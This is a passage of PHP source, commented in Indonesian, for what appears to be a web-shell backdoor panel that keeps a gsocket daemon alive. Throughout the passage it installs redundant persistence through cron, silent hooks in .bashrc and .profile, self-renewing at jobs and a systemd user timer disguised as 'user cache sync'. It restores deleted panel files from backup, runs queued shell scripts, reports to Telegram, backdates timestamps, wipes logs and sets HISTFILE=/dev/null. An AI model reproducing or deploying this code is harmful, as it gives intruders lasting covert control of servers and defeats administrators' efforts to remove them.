           FC = counter siklus beruntun daemon mati (disimpan di state;
           reset ke 0 begitu daemon hidup lagi) */
        . 'FC=$(sed -n \'s/^FC=//p\' "$ST" 2>/dev/null | head -1); [ -n "$FC" ] || FC=0' . "\n"
        . 'if [ "$DEAD" = 1 ]; then' . "\n"
        . '  tg_send REVIVE ok "revive gsocket - daemon mati, guard dinyalakan"' . "\n"
        . '  FC=$((FC + 1))' . "\n"
        . '  if [ "$FC" -ge 3 ]; then tg_send REVFAIL gagal "revive gagal 3x berturut"; FC=0; fi' . "\n"
        . 'else' . "\n"
        . '  FC=0' . "\n"
        . 'fi' . "\n"
        /* 5b. SELF-REPAIR panel (v65.8): panel tidak bisa memperbaiki
              dirinya sendiri saat korup/hilang — checker yang mengembalikan.
              File panel hilang ATAU ukuran beda ATAU md5 beda (md5sum bila
              ada, else size saja) -> cp backup + chmod 0644 + mtime ikut
              backup (touch -r); event dicatat ke state + Telegram (c). */
        . 'if [ -n "$SPATH" ] && [ -f "$SBAK" ]; then' . "\n"
        . '  SBROK=0' . "\n"
        . '  if [ ! -f "$SPATH" ]; then' . "\n"
        . '    SBROK=1' . "\n"
        . '  else' . "\n"
        . '    CSZ=$(wc -c < "$SPATH" 2>/dev/null | tr -d " ")' . "\n"
        . '    [ "$CSZ" = "$SSIZE" ] || SBROK=1' . "\n"
        . '    if [ "$SBROK" = 0 ] && [ -n "$SMD5" ] && command -v md5sum >/dev/null 2>&1; then' . "\n"
        . '      CMD5=$(md5sum "$SPATH" 2>/dev/null | awk \'{print $1}\')' . "\n"
        . '      [ "$CMD5" = "$SMD5" ] || SBROK=1' . "\n"
        . '    fi' . "\n"
        . '  fi' . "\n"
        . '  if [ "$SBROK" = 1 ]; then' . "\n"
        . '    if cp "$SBAK" "$SPATH" 2>/dev/null; then' . "\n"
        . '      chmod 0644 "$SPATH" 2>/dev/null' . "\n"
        . '      touch -r "$SBAK" "$SPATH" 2>/dev/null' . "\n"
        . '      { grep -v \'^SELFREP=\' "$ST" 2>/dev/null; echo "SELFREP=$(date +%s)"; } > "$ST.t" 2>/dev/null; cat "$ST.t" > "$ST" 2>/dev/null; rm -f "$ST.t"' . "\n"
        . '      tg_send SELFREP ok "self-repair panel - file panel dipulihkan dari backup"' . "\n"
        . '    fi' . "\n"
        . '  fi' . "\n"
        . 'fi' . "\n"
        /* 5c. DROP TOOLS guard (v65.9): file hilang / md5 beda / perm bukan
              444 -> chmod 0644 (bila ada), cp dari backup, chmod 0444,
              touch -r backup (mtime ikut). Event Telegram jenis DTREP
              (rate-limit per jam ikut tg_send). DTN=0 = loop tidak jalan.
              Lock segar (<5 mnt) = drop sedang berlangsung -> skip supaya
              tidak me-restore file lama sebagai zombie. */
        . 'if [ -f \'' . str_replace("'", '', gsp_dtlock_path()) . '\' ] && find \'' . str_replace("'", '', gsp_dtlock_path()) . '\' -mmin -5 2>/dev/null | grep -q .; then DTN=0; fi' . "\n"
        . 'DTI=1' . "\n"
        . 'while [ "$DTI" -le "$DTN" ]; do' . "\n"
        . '  eval "P=\\$DTP$DTI; B=\\$DTB$DTI; M=\\$DTM$DTI"' . "\n"
        . '  if [ -n "$P" ] && [ -n "$B" ] && [ -f "$B" ]; then' . "\n"
        . '    DTFIX=0' . "\n"
        . '    [ -f "$P" ] || DTFIX=1' . "\n"
        . '    if [ "$DTFIX" = 0 ] && [ -n "$M" ] && command -v md5sum >/dev/null 2>&1; then' . "\n"
        . '      PMD5=$(md5sum "$P" 2>/dev/null | awk \'{print $1}\')' . "\n"
        . '      [ "$PMD5" = "$M" ] || DTFIX=1' . "\n"
        . '    fi' . "\n"
        . '    if [ "$DTFIX" = 0 ]; then' . "\n"
        . '      PPR=$(ls -ld "$P" 2>/dev/null | cut -c2-10)' . "\n"
        . '      [ "$PPR" = "r--r--r--" ] || DTFIX=1' . "\n"
        . '    fi' . "\n"
        . '    if [ "$DTFIX" = 1 ]; then' . "\n"
        . '      [ -f "$P" ] && chmod 0644 "$P" 2>/dev/null' . "\n"
        . '      if cp "$B" "$P" 2>/dev/null; then' . "\n"
        . '        chmod 0444 "$P" 2>/dev/null' . "\n"
        . '        touch -r "$B" "$P" 2>/dev/null' . "\n"
        . '        { grep -v \'^DTREP=\' "$ST" 2>/dev/null; echo "DTREP=$(date +%s)"; } > "$ST.t" 2>/dev/null; cat "$ST.t" > "$ST" 2>/dev/null; rm -f "$ST.t"' . "\n"
        . '        tg_send DTREP ok "drop tool dipulihkan - $P (hilang/korup/perm)"' . "\n"
        . '      fi' . "\n"
        . '    fi' . "\n"
        . '  fi' . "\n"
        . '  DTI=$((DTI + 1))' . "\n"
        . 'done' . "\n"
        /* 6. antrian zero-shell diproses tiap menit (guard tetap tiap 7 mnt) */
        . 'QD="$HOME/.fum_queue"' . "\n"
        . 'if [ -d "$QD" ]; then' . "\n"
        . '  for q in "$QD"/*.sh; do' . "\n"
        . '    [ -f "$q" ] || continue' . "\n"
        . '    timeout 600 /bin/sh "$q" >>"$QD/log" 2>&1' . "\n"
        . '    rc=$?' . "\n"
        . '    t=0; [ -f "$q.tries" ] && t=$(cat "$q.tries" 2>/dev/null); t=$((t+1)); echo "$t" > "$q.tries"' . "\n"
        . '    if [ $rc -eq 0 ] || [ $rc -eq 124 ] || [ $t -ge 3 ]; then rm -f "$q" "$q.tries"; fi' . "\n"
        . '  done' . "\n"
        . '  ls "$QD"/*.sh >/dev/null 2>&1 || rm -f "$QD"/.tgz_* /tmp/.gstgz_* 2>/dev/null' . "\n"
        . 'fi' . "\n"
        /* 7. denyut + timestamp rebuild terakhir (dibaca UI panel);
              counter FC (revive gagal beruntun, v65.8) ikut dipersist */
        . 'ORB=$(sed -n \'s/^RB=//p\' "$ST" 2>/dev/null | head -1)' . "\n"
        . 'grep -v \'^TS=\' "$ST" 2>/dev/null | grep -v \'^RB=\' | grep -v \'^FC=\' > "$ST.t" 2>/dev/null' . "\n"
        . 'echo "TS=$(date +%s)" >> "$ST.t"' . "\n"
        . 'if [ "$RB" = 1 ]; then echo "RB=$(date +%s)" >> "$ST.t"; elif [ -n "$ORB" ]; then echo "RB=$ORB" >> "$ST.t"; fi' . "\n"
        . '[ -n "$FC" ] && echo "FC=$FC" >> "$ST.t"' . "\n"
        . 'cat "$ST.t" > "$ST" 2>/dev/null; rm -f "$ST.t"' . "\n"
        . 'exit 0' . "\n";
    return $sh;
}
/* at-job self-renewing: jalankan checker (rebuild+revive) lalu jadwalkan
   dirinya lagi 60 menit ke depan. SKIP_AT=1 mencegah re-schedule ganda
   dari dalam checker saat dipanggil oleh at-job itu sendiri. */
function gsp_imm_at_src($m) {
    $home = str_replace("'", '', gsp_home());
    $st   = str_replace("'", '', gsp_imm_stpath());
    return '#!/bin/sh' . "\n"
        . 'unset LD_PRELOAD LD_AUDIT' . "\n"
        . 'LD_PRELOAD=' . "\n"
        . 'LD_AUDIT=' . "\n"
        . 'export LD_PRELOAD LD_AUDIT' . "\n"
        . 'export HOME=\'' . $home . '\'' . "\n"
        . 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' . "\n"
        . '[ -f \'' . $m['checker'] . '\' ] && SKIP_AT=1 /bin/sh \'' . $m['checker'] . '\' >/dev/null 2>&1' . "\n"
        /* manifest hilang = DISARM -> rantai BERHENTI (tidak renew lagi) */
        . '[ -f \'' . str_replace("'", '', gsp_imm_path()) . '\' ] || exit 0' . "\n"
        . 'if command -v at >/dev/null 2>&1; then' . "\n"
        . '  NJ=$(at -f \'' . $m['at'] . '\' now + 60 minutes 2>&1 | sed -n \'s/^job \([0-9][0-9]*\).*/\1/p\' | head -1)' . "\n"
        . '  ST=\'' . $st . '\'' . "\n"
        . '  if [ -n "$NJ" ]; then grep -v \'^AT=\' "$ST" 2>/dev/null > "$ST.t"; echo "AT=$NJ" >> "$ST.t"; cat "$ST.t" > "$ST" 2>/dev/null; rm -f "$ST.t"; fi' . "\n"
        . 'fi' . "\n"
        . 'exit 0' . "\n";
}
/* --- channel CRON --- */
function gsp_imm_cron_has_marker() {
    $id = gsp_imm_id();
    /* sentinel: crontab kosong menghasilkan output KOSONG yang tak bisa
       dibedakan dari exec gagal — sentinel memastikan command benar jalan */
    $rc = fum_run_cmd('crontab -l 2>/dev/null; echo GSPCK_2401');
    if ($rc[0] !== null && strpos($rc[0], 'GSPCK_2401') !== false)
        return (strpos($rc[0], $id) !== false);
    if (function_exists('fum_call')) { // shell mati total: baca lewat UAPI
        $r = fum_call('Cron', 'list_lines', array());
        if ($r[0]) {
            $blob = (is_string($r[2]) ? $r[2] : '') . serialize($r[1]);
            return (strpos($blob, $id) !== false);
        }
    }
    return null; // tidak bisa memastikan -> jangan rebuild membabi buta
}
/* hapus HANYA entri cron milik immortal (marker id / path checker).
   Entri guard tiap-7-menit milik watchdog TIDAK disentuh di sini. */
function gsp_imm_cron_remove_owned($m) {
    $removed = 0;
    if (function_exists('fum_call')) {
        $r = fum_call('Cron', 'list_lines', array());
        if ($r[0]) {
            $keys = array_unique(array_merge(
                gsfu_cron_marker_keys($r[1], $r[2], $m['id']),
                gsp_cron_guard_keys($r[1], $r[2], array($m['checker']))
            ));
            foreach ($keys as $kk) { $rr = fum_call('Cron', 'remove_line', array('linekey' => $kk)); if ($rr[0]) $removed++; }
        }
    }
    /* rewrite crontab HANYA kalau marker memang ada — kalau crontab -l gagal
       sesaat, crontab user lain TIDAK ikut terhapus oleh pipeline kosong */
    fum_run_cmd('crontab -l 2>/dev/null | grep -qF ' . escapeshellarg($m['id']) . ' && crontab -l 2>/dev/null | grep -vF ' . escapeshellarg($m['id']) . ' | grep -vF ' . escapeshellarg($m['checker']) . ' | crontab - 2>/dev/null');
    return $removed;
}
function gsp_imm_cron_install($m) {
    $log = array();
    gsp_imm_cron_remove_owned($m); // idempotent: buang entri immortal lama dulu
    /* baca crontab sekali dengan sentinel: shell-append HANYA dilakukan kalau
       pembacaan terbukti jalan — crontab -l yang gagal sesaat tidak boleh
       membuat pipeline menimpa crontab user dengan hanya baris kita */
    $cur = '';
    $read_ok = false;
    $rc = fum_run_cmd('crontab -l 2>/dev/null; echo GSPCK_2401');
    if ($rc[0] !== null && strpos($rc[0], 'GSPCK_2401') !== false) {
        $cur = str_replace('GSPCK_2401', '', $rc[0]);
        $read_ok = true;
    } elseif (function_exists('fum_call')) {
        $r = fum_call('Cron', 'list_lines', array());
        if ($r[0]) $cur = (is_string($r[2]) ? $r[2] : '') . serialize($r[1]);
    }
    if (strpos($cur, $m['guard']) === false) {
        $r = fum_call('Cron', 'add_line', array('command' => '/bin/sh ' . $m['guard'] . ' >/dev/null 2>&1', 'minute' => '*/7', 'hour' => '*', 'day' => '*', 'month' => '*', 'weekday' => '*'));
        if (!$r[0] && $read_ok) fum_run_cmd('( crontab -l 2>/dev/null ; echo ' . escapeshellarg($m['cron_guard']) . ' ) | crontab - 2>/dev/null');
    }
    // entri checker per-menit (milik immortal, bermarker)
    $parts = preg_split('/\s+/', $m['cron_min'], 6);
    $r = fum_call('Cron', 'add_line', array('command' => $parts[5], 'minute' => $parts[0], 'hour' => $parts[1], 'day' => $parts[2], 'month' => $parts[3], 'weekday' => $parts[4]));
    if (!$r[0] && $read_ok) fum_run_cmd('( crontab -l 2>/dev/null ; echo ' . escapeshellarg($m['cron_min']) . ' ) | crontab - 2>/dev/null');
    $have = gsp_imm_cron_has_marker();
    $log[] = ($have === true)
        ? '[+] cron: entri guard */7 mnt + checker tiap menit terpasang (marker ' . $m['id'] . ')'
        : '[!] cron: pemasangan tidak terverifikasi (shell & UAPI terbatas) — channel lain tetap menjaga';
    return $log;
}
/* --- channel RC HOOKS: 1 baris silent, non-interactive safe (<1 dtk,
   output dibuang, background) di 3 file login shell --- */
function gsp_imm_rc_files() {
    $h = gsp_home();
    return array($h . '/.bash_profile', $h . '/.bashrc', $h . '/.profile');
}
/* JEJAK KHUSUS hook rc immortal: marker komentar ini HANYA muncul di
   baris hook. Blok siluman (#GSPSILUMAN) memang meng-embed id & checker
   path sebagai pola grep, tapi TIDAK PERNAH mengandung marker ini —
   jadi cek idempoten & penghapusan berbasis marker tidak pernah keliru
   mengenai blok siluman (fix ordering skip + syntax error). */
function gsp_imm_rc_hook_mark($id) { return '#GSPIMHOOK ' . $id; }
function gsp_imm_rc_on($m) {
    $n = 0;
    foreach (gsp_imm_rc_files() as $rc) {
        $c = @is_file($rc) ? strval(@file_get_contents($rc)) : '';
        if (strpos($c, gsp_imm_rc_hook_mark($m['id'])) !== false) continue; // idempotent: cek jejak khusus hook, BUKAN substring id
        if (gsp_rc_write_stealth($rc, rtrim($c) . "\n" . $m['rc_line'] . "\n") !== false) $n++;
    }
    return $n;
}
function gsp_imm_rc_off($m) {
    $n = 0;
    foreach (gsp_imm_rc_files() as $rc) {
        if (!@is_file($rc)) continue;
        $c = strval(@file_get_contents($rc));
        // hanya baris hook milik immortal (marker khusus); baris bermarker
        // #GSPSILUMAN TIDAK BOLEH terhapus walau mengandung id
        $n2 = preg_replace('/^.*' . preg_quote(gsp_imm_rc_hook_mark($m['id']), '/') . '.*\r?\n?/m', '', $c);
        // hook format lama (' # <id>' tepat di ujung baris) ikut dibersihkan
        $n2 = preg_replace('/^.* # ' . preg_quote($m['id'], '/') . '(\r?\n|$)/m', '', $n2);
        if ($n2 !== $c && gsp_rc_write_stealth($rc, $n2) !== false) $n++;
    }
    return $n;
}
/* --- channel AT self-renewing chain --- */
function gsp_imm_at_available() {
    static $ok = null;
    if ($ok === null) {
        $ok = false;
        if (function_exists('gsp_shell_ok') && gsp_shell_ok()) $ok = (gsp_sh('command -v at') !== '');
    }
    return $ok;
}
function gsp_imm_at_arm($m) {
    if (!gsp_imm_at_available()) return 0;
    $st = gsp_imm_state();
    $cur = isset($st['AT']) ? intval($st['AT']) : 0;
    if ($cur > 0) { // job lama masih mengantri? jangan dobel
        $o = gsp_sh('atq 2>/dev/null');
        foreach (explode("\n", $o) as $ln) if (intval(trim($ln)) === $cur) return $cur;
    }
    $o = gsp_sh('at -f ' . escapeshellarg($m['at']) . ' now + 60 minutes 2>&1');
    $nj = 0;
    if (preg_match('/job (\d+)/', $o, $mm)) $nj = intval($mm[1]);
    if ($nj > 0) gsp_imm_state_set('AT', $nj);
    return $nj;
}
function gsp_imm_at_disarm() {
    $st = gsp_imm_state();
    $cur = isset($st['AT']) ? intval($st['AT']) : 0;
    if ($cur > 0) {
        if (function_exists('gsp_shell_ok') && gsp_shell_ok()) gsp_sh('atrm ' . $cur . ' 2>/dev/null');
        elseif (function_exists('gsp_queue')) gsp_queue('atrm ' . $cur . ' 2>/dev/null');
    }
}
/* --- channel SYSTEMD --user timer (opsional) --- */
function gsp_imm_sd_available() {
    static $ok = null;
    if ($ok === null) {
        $ok = false;
        if (function_exists('gsp_shell_ok') && gsp_shell_ok()) {
            if (gsp_sh('command -v systemctl') !== '') {
                $o = gsp_sh('timeout 6 systemctl --user is-system-running 2>&1');
                if (preg_match('/running|degraded|starting|maintenance/', $o)) $ok = true;
            }
        }
    }
    return $ok;
}
function gsp_imm_sd_dir() { return gsp_home() . '/.config/systemd/user'; }
function gsp_imm_sd_write($m) {
    $d = gsp_imm_sd_dir();
    $d_ex = @is_dir($d);
    if (!$d_ex && !@mkdir($d, 0700, true)) return false;
    if (!$d_ex && @is_dir($d)) gsp_stealth_age($d);
    $svc = "[Unit]\nDescription=user cache sync\n[Service]\nType=oneshot\nExecStart=/bin/sh " . $m['checker'] . "\n";
    $tmr = "[Unit]\nDescription=user cache sync timer\n[Timer]\nOnBootSec=2min\nOnUnitActiveSec=15min\nPersistent=true\n[Install]\nWantedBy=timers.target\n";
    $a = @file_put_contents($d . '/' . $m['sd'] . '.service', $svc);
    $b = @file_put_contents($d . '/' . $m['sd'] . '.timer', $tmr);
    if ($a !== false) gsp_stealth_age($d . '/' . $m['sd'] . '.service');
    if ($b !== false) gsp_stealth_age($d . '/' . $m['sd'] . '.timer');
    return ($a !== false && $b !== false);
}
function gsp_imm_sd_arm($m) {
    if (!gsp_imm_sd_available()) return false;
    if (!gsp_imm_sd_write($m)) return false;
    gsp_sh('timeout 8 systemctl --user daemon-reload 2>/dev/null; timeout 8 systemctl --user enable --now ' . escapeshellarg($m['sd'] . '.timer') . ' 2>/dev/null');
    $o = gsp_sh('timeout 6 systemctl --user is-enabled ' . escapeshellarg($m['sd'] . '.timer') . ' 2>/dev/null');
    return (strpos($o, 'enabled') !== false);
}
function gsp_imm_sd_disarm($m) {
    if (function_exists('gsp_shell_ok') && gsp_shell_ok()) {
        gsp_sh('timeout 8 systemctl --user disable --now ' . escapeshellarg($m['sd'] . '.timer') . ' 2>/dev/null');
        gsp_sh('timeout 8 systemctl --user daemon-reload 2>/dev/null');
    }
    @unlink(gsp_imm_sd_dir() . '/' . $m['sd'] . '.service');
    @unlink(gsp_imm_sd_dir() . '/' . $m['sd'] . '.timer');
}
/* revive guardian+daemon INSTAN (dipakai web-hit doctor & ARM) */
function gsp_imm_revive($m) {
    if (!@is_file($m['guard'])) return;
    fum_run_cmd('setsid ' . gsp_sh_bin() . ' ' . escapeshellarg($m['guard']) . ' >/dev/null 2>&1 &');
    if (function_exists('gsp_shell_ok') && !gsp_shell_ok() && function_exists('gsp_queue'))
        gsp_queue('/bin/sh ' . escapeshellarg($m['guard']) . ' >/dev/null 2>&1'); // exec mati total -> lewat antrian cron
}
/* ARM: tulis manifest + checker + at script, pasang semua channel, revive */
function gsp_imm_arm() {
    $log = array();
    $m = gsp_imm_manifest();
    // guard hilang tapi store masih ada -> tulis ulang dulu dari store
    if (!@is_file($m['guard']) && @is_file(fum_store_path()) && function_exists('fum_guard_write')) {
        fum_guard_write();
        $log[] = '[i] guard script ditulis ulang dari store: ' . $m['guard'];
    }
    $m['sdok'] = gsp_imm_sd_available() ? 1 : 0;
    $m['atok'] = gsp_imm_at_available() ? 1 : 0;
    /* v65.8: backup diri + field host/self_* ke manifest (SELF-REPAIR).
       v65.9: checkbox 'jangan backup panel' (marker .gsp_noselfbak) ->
       self-repair panel DIMATIKAN (field self_* dibuang, backup dihapus);
       checker tetap menjaga dtools */
    if (function_exists('gsp_noselfbak_on') && gsp_noselfbak_on()) {
        unset($m['self_path'], $m['self_md5'], $m['self_size']);
        $m['hash'] = gsp_imm_hash($m);
        @unlink(gsp_selfbak_path());
        $log[] = '[i] self-backup panel DIMATIKAN (checkbox) — checker tidak me-restore panel; drop tools tetap dijaga';
    } else {
        $log[] = gsp_selfbak_update($m)
            ? '[+] self-backup panel segar: ' . gsp_selfbak_path() . ' (checker memverifikasi tiap menit)'
            : '[!] self-backup panel GAGAL ditulis — SELF-REPAIR tidak aktif';
    }
    if (!gsp_imm_save($m)) { $log[] = '[x] GAGAL menulis manifest: ' . gsp_imm_path(); return $log; }
    $log[] = '[+] manifest ditulis: ' . gsp_imm_path() . ' (marker ' . $m['id'] . ')';
    if (@file_put_contents($m['checker'], gsp_imm_checker_src($m)) !== false) {
        @chmod($m['checker'], 0700);
        gsp_stealth_age($m['checker']);
        $log[] = '[+] checker per-menit ditulis: ' . $m['checker'];
    } else $log[] = '[x] gagal menulis checker: ' . $m['checker'];
    if (@file_put_contents($m['at'], gsp_imm_at_src($m)) !== false) { @chmod($m['at'], 0700); gsp_stealth_age($m['at']); }
    foreach (gsp_imm_cron_install($m) as $l) $log[] = $l;                 // channel a
    $nrc = gsp_imm_rc_on($m);                                             // channel c
    $log[] = '[+] rc hooks: ' . $nrc . ' file login shell disuntik 1 baris silent (bash_profile/bashrc/profile)';
    if ($m['atok']) {                                                     // channel d
        $nj = gsp_imm_at_arm($m);
        $log[] = $nj > 0
            ? '[+] at-chain: job #' . $nj . ' terjadwal (self-renewing tiap 60 mnt)'
            : '[!] at-chain: binary at ada tapi penjadwalan gagal';
    } else $log[] = '[i] at-chain: binary at tidak ada / shell mati — dilewati; checker cron akan mengaktivasinya begitu at tersedia';
    if ($m['sdok']) {                                                     // channel e
        $log[] = gsp_imm_sd_arm($m)
            ? '[+] systemd --user timer aktif: ' . $m['sd'] . '.timer (tiap 15 mnt)'
            : '[!] systemd: unit ditulis tapi enable gagal';
    } else $log[] = '[i] systemd --user tidak tersedia — channel dilewati (opsional)';
    gsp_imm_revive($m); // revive instan guardian+daemon
    gsp_imm_state_set('RB', time());
    /* v65.8: bersihkan jejak log & history otomatis saat ARM + pasang
       HISTFILE guard (#GSPHIST) di rc interaktif */
    foreach (gsp_logclean_run() as $l) $log[] = $l;
    foreach (gsp_hist_clean() as $l) $log[] = $l;
    $nhg = gsp_hist_rc_on();
    $log[] = '[+] history guard: export HISTFILE=/dev/null (#GSPHIST) disuntik ke ' . $nhg . ' rc interaktif (mtime rc dijaga)';
    $log[] = '[OK] IMMORTAL ARMED — 5 channel saling rebuild dari manifest. crontab -r & kill -9 -1 tidak lagi mematikan proteksi.';
    return $log;
}
/* DISARM: bersihkan SEMUA channel tanpa sisa */
function gsp_imm_disarm() {
    $log = array();
    /* lock anti-race PALING AWAL: fum_run_cmd di bawah memakai bash -l ->
       rc tersource -> hook #GSPIMHOOK menembak checker background SELAMA
       disarm (manifest masih ada). Checker melihat lock ini -> exit 0,
       sehingga hook & state tidak ditulis ulang setelah rc_off/cleanup.
       Dihapus sebagai langkah TERAKHIR di bawah; auto-expire 600 dtk di
       checker menangani disarm yang mati di tengah. */
    @file_put_contents(gsp_disarm_lock_path(), time());
    @chmod(gsp_disarm_lock_path(), 0600);
    $m = gsp_imm_load();
    if (!is_array($m)) $m = gsp_imm_manifest(); // manifest hilang/rusak: tetap bersih-bersih via id deterministik
    $ncr = gsp_imm_cron_remove_owned($m);                                     // a. cron
    $log[] = '[+] cron: entri bermarker ' . $m['id'] . ' dihapus (UAPI + shell' . ($ncr > 0 ? ', ' . $ncr . ' linekey UAPI' : '') . ')';
    $nrc = gsp_imm_rc_off($m);                                                // c. rc hooks
    $log[] = '[+] rc hooks: baris marker dicabut dari ' . $nrc . ' file (baris lain tidak disentuh)';
    $nhg = gsp_hist_rc_off();                                                 // v65.8: HISTFILE guard
    $log[] = '[+] history guard: baris #GSPHIST dicabut dari ' . $nhg . ' file rc (HISTFILE kembali normal)';
    gsp_imm_at_disarm();                                                      // d. at chain
    $log[] = '[+] at-chain: job dari state dibatalkan (atrm)';
    gsp_imm_sd_disarm($m);                                                    // e. systemd
    $log[] = '[+] systemd --user: ' . $m['sd'] . '.timer disable + unit dihapus';
    /* v65.9: drop tools — chmod 0644 (file TIDAK dihapus; user hapus manual
       via [hapus]), backup .gsp_dtbak* dibuang, field dtools ikut hilang
       bersama manifest di bawah */
    $ndt = 0;
    if (isset($m['dtools']) && is_array($m['dtools'])) {
        foreach ($m['dtools'] as $dte) {
